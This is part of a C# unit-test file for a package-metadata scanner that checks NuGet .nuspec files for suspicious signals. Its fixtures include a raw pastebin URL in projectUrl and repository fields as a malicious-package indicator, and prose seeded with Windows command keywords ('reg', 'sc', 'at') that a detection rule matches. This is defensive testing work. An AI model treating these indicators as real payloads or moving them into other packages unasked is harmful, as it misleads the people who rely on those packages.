    public void ScanPackageMetadata_TokenInNonProseElement_StillFlagged()
    {
        using var dir = new TempDir();
        const string name = "Signal.Package.nuspec";
        var path = dir.WriteFile(name, SignalNuspec());

        var findings = new ScriptRuleScanner().ScanPackageMetadata(path, name);

        Assert.NotEmpty(findings);
        Assert.All(findings, f =>
        {
            Assert.False(string.IsNullOrEmpty(f.RuleId));
            Assert.Equal(name, f.RelativePath);
            Assert.Equal(ScriptFindingSource.PackageMetadata, f.Source);
            Assert.True(f.StartLine >= 1);
            Assert.True(f.Occurrences >= 1);
        });
    }

    // The end-to-end form of the local-name fix, over a real .nuspec whose metadata elements are namespace-qualified —
    // a shape NuGet installs happily. The prefixed prose must produce NO finding, while the pastebin URL in the
    // (non-prose) <nu:projectUrl>/<nu:repository url> is still reported. Pre-fix the prefixed prose was scanned raw and
    // its BD000600 bare words landed on the prose lines, which the last assertion rules out.
    // The first two assertions keep the test honest: scanned WITHOUT redaction, this very file DOES trip the rules, and
    // it trips them ON the prose lines — so redaction is what removes them, not an absence of anything to find.
    [Fact]
    public void ScanPackageMetadata_PrefixedNuspecProse_YieldsNoProseFindingButKeepsUrl()
    {
        using var dir = new TempDir();
        const string name = "Prefixed.Package.nuspec";
        var lines = PrefixedNuspecLines();
        var proseLines = LineNumbersContaining(lines, "<nu:tags>", "<nu:description>", "<nu:releaseNotes>", "renderer");
        var urlLines = LineNumbersContaining(lines, PastebinUrl);
        var path = dir.WriteFile(name, string.Join("\n", lines));
        var scanner = new ScriptRuleScanner();

        var unredacted = scanner.ScanFile(path, name);
        var findings = scanner.ScanPackageMetadata(path, name);

        Assert.NotEmpty(unredacted);                                                    // not vacuous ...
        Assert.Contains(unredacted, f => proseLines.Contains(f.StartLine));             // ... and the prose IS a trigger
        Assert.NotEmpty(findings);                                                      // the url signal survives ...
        Assert.All(findings, f => Assert.Contains(f.StartLine, urlLines));              // ... and is all that is left
        Assert.All(findings, f => Assert.Equal(ScriptFindingSource.PackageMetadata, f.Source));
    }

    // Never-throws: a manifest path that is not on disk (or is empty) yields an empty list, not an exception.
    [Fact]
    public void ScanPackageMetadata_MissingFile_ReturnsEmptyAndDoesNotThrow()
    {
        var missing = Path.Combine(Path.GetTempPath(), $"silvergun-no-such-{Guid.NewGuid():N}.nuspec");
        var scanner = new ScriptRuleScanner();

        var findings = default(IReadOnlyList<ScriptFinding>);
        var ex = Record.Exception(() => findings = scanner.ScanPackageMetadata(missing, "Missing.nuspec"));

        Assert.Null(ex);
        Assert.Empty(findings!);
        Assert.Empty(scanner.ScanPackageMetadata(string.Empty, "Missing.nuspec"));
    }

    // Why redaction blanks in place instead of stripping: a token below a long, multi-line redacted <releaseNotes>
    // must still report the line it occupies in the REAL file. The expected line is computed from the original text,
    // so the assertion fails the moment redaction stops preserving length/newlines.
    [Fact]
    public void ScanPackageMetadata_StartLine_MatchesOriginalFileLine()
    {
        using var dir = new TempDir();
        const string name = "Line.Package.nuspec";
        var lines = SignalNuspecLines();
        var expectedLine = lines.FindIndex(l => l.Contains(PastebinUrl, StringComparison.Ordinal)) + 1;
        var path = dir.WriteFile(name, string.Join("\n", lines));

        var findings = new ScriptRuleScanner().ScanPackageMetadata(path, name);

        Assert.True(expectedLine > 10, "the matching token must sit well below the multi-line redacted prose.");
        Assert.NotEmpty(findings);
        Assert.All(findings, f => Assert.Equal(expectedLine, f.StartLine));
    }
    #endregion

    #region Methods — fixtures
    // A benign, user-authored-looking manifest whose prose carries BD000600's bare English words: "control" and "at"
    // (the measured triggers), plus "update", "reg", "sc" and "te" — each whitespace-delimited, as the rule requires.
    private static string ProseNuspec() => string.Join("\n",
        "<?xml version=\"1.0\" encoding=\"utf-8\"?>",
        "<package xmlns=\"http://schemas.microsoft.com/packaging/2013/05/nuspec.xsd\">",
        "  <metadata>",
        "    <id>Benign.Console.Snapshot</id>",
        "    <version>0.1.5</version>",
        "    <authors>A Benign Author</authors>",
        "    <owners>A Benign Author</owners>",
        "    <title>Benign Console Snapshot</title>",
        "    <tags>console snapshot at control update reg sc te</tags>",
        "    <copyright>Copyright 2026 A Benign Author</copyright>",
        "    <summary>Snapshot testing for console output, wrapped to the control width.</summary>",
        "    <description>Word-wraps paragraph text to the control width so long lines are not clipped at the right edge.</description>",
        "    <releaseNotes>### 0.1.5",
        "- You can update the renderer at any time; text is clipped at the width you set.",
        "- The sc and te helpers are gone; use reg to register a renderer instead.",
        "- Paragraphs are word-wrapped to the control width, so a long line is no longer clipped at the right edge",
        "  of the terminal window when the window is narrower than the text it has been asked to render.",
        "    </releaseNotes>",
        "  </metadata>",
        "</package>");

    private const string ProseNuspecName = "Benign.Console.Snapshot.nuspec";

    // A pastebin URL is high-confidence, non-prose manifest signal (BD000500) — exactly what redaction must preserve.
    private const string PastebinUrl = "https://pastebin.com/raw/aBcD1234";

    // Non-element-construct fixtures: prose bodies carrying BD000600's bare words, sitting either side of the
    // construct under test, plus the non-prose element that has to survive byte-identically beside them.
    private const string EarlierProse = "earlier at control";
    private const string LaterProse = "later at control update";
    private const string ProjectUrl = "https://example.org/project";

    private static string SignalNuspec() => string.Join("\n", SignalNuspecLines());

    // The same benign prose as ProseNuspec (multi-line, redacted) followed by a <projectUrl> carrying the pastebin
    // URL well below it, so the reported line number is a meaningful assertion.
    private static List<string> SignalNuspecLines() =>
    [
        "<?xml version=\"1.0\" encoding=\"utf-8\"?>",
        "<package xmlns=\"http://schemas.microsoft.com/packaging/2013/05/nuspec.xsd\">",
        "  <metadata>",
        "    <id>Signal.Package</id>",
        "    <version>2.0.0</version>",
        "    <authors>A Benign Author</authors>",
        "    <description>Word-wraps paragraph text to the control width so nothing is clipped at the right edge.</description>",
        "    <releaseNotes>### 2.0.0",
        "- You can update the renderer at any time; text is clipped at the width you set.",
        "- The sc and te helpers are gone; use reg to register a renderer instead.",
        "- Paragraphs are word-wrapped to the control width, so a long line is no longer clipped at the right edge.",
        "    </releaseNotes>",
        $"    <projectUrl>{PastebinUrl}</projectUrl>",
        "  </metadata>",
        "</package>",
    ];

    // The same benign prose, with every metadata element namespace-qualified (valid, installable NuGet), so the prose
    // lines and the two non-prose URL lines can be told apart by line number.
    private static List<string> PrefixedNuspecLines() =>
    [
        "<?xml version=\"1.0\" encoding=\"utf-8\"?>",
        "<nu:package xmlns:nu=\"http://schemas.microsoft.com/packaging/2013/05/nuspec.xsd\">",
        "  <nu:metadata>",
        "    <nu:id>Prefixed.Package</nu:id>",
        "    <nu:version>3.0.0</nu:version>",
        "    <nu:tags>console snapshot at control update reg sc te</nu:tags>",
        "    <nu:description>Word-wraps paragraph text to the control width so nothing is clipped at the right edge.</nu:description>",
        "    <nu:releaseNotes>### 3.0.0",
        "- You can update the renderer at any time; text is clipped at the width you set.",
        "- The sc and te helpers are gone; use reg to register a renderer instead.",
        "    </nu:releaseNotes>",
        $"    <nu:projectUrl>{PastebinUrl}</nu:projectUrl>",
        $"    <nu:repository type=\"git\" url=\"{PastebinUrl}\" />",
        "  </nu:metadata>",
        "</nu:package>",
    ];
    #endregion

    #region Methods — helpers
    private static void AssertLengthAndNewlinesPreserved(string input, string result)
    {
        Assert.Equal(input.Length, result.Length);
        Assert.Equal(Newlines(input), Newlines(result));
    }

    // Every newline character with its position — the redaction contract is that this layout is identical, so a
    // StartLine measured on the redacted text names the same line of the real file.
    private static (int Index, char Ch)[] Newlines(string value) =>
        Enumerable.Range(0, value.Length)
            .Where(i => value[i] is '\r' or '\n')
            .Select(i => (i, value[i]))
            .ToArray();

    // The 1-based line numbers of the lines holding any of `needles` — how a finding's StartLine is attributed to the
    // prose or the non-prose part of a fixture manifest.
    private static HashSet<int> LineNumbersContaining(List<string> lines, params string[] needles) =>
        [.. Enumerable.Range(0, lines.Count)
            .Where(i => needles.Any(n => lines[i].Contains(n, StringComparison.Ordinal)))
            .Select(i => i + 1)];

    // The character content of the first <element>…</element> pair in the (already redacted) text.
    private static string Body(string value, string element)
    {
        var open = value.IndexOf($"<{element}>", StringComparison.Ordinal) + element.Length + 2;
        var close = value.IndexOf($"</{element}>", StringComparison.Ordinal);
        return value[open..close];
    }
    #endregion

    #region Fields
    // Wall-clock ceiling for the multi-megabyte degenerate inputs. Enormously generous on purpose (see the comment on
    // RedactProse_DegenerateUnclosedTags_CompletesQuickly): it must catch a super-linear regression, not measure speed.
    private static readonly TimeSpan degenerateBudget = TimeSpan.FromSeconds(5);
    #endregion

    #region Child types
    // A self-cleaning temp directory (mirrors YaraScanDirectoryTests); WriteFile returns the absolute path written.
    private sealed class TempDir : IDisposable
    {
        public TempDir()
        {
            Root = Path.Combine(Path.GetTempPath(), "silvergun-nuspec-redact-" + Guid.NewGuid().ToString("N"));
            Directory.CreateDirectory(Root);
        }

        public string Root { get; }

        public string WriteFile(string name, string content)
        {
            var full = Path.Combine(Root, name);
            File.WriteAllText(full, content);
            return full;
        }

        public void Dispose()
        {
            try
            {
                if (Directory.Exists(Root))
                    Directory.Delete(Root, recursive: true);
            }
            catch (Exception ex) when (ex is IOException or UnauthorizedAccessException) { /* best-effort temp cleanup */ }
        }
    }
    #endregion
}
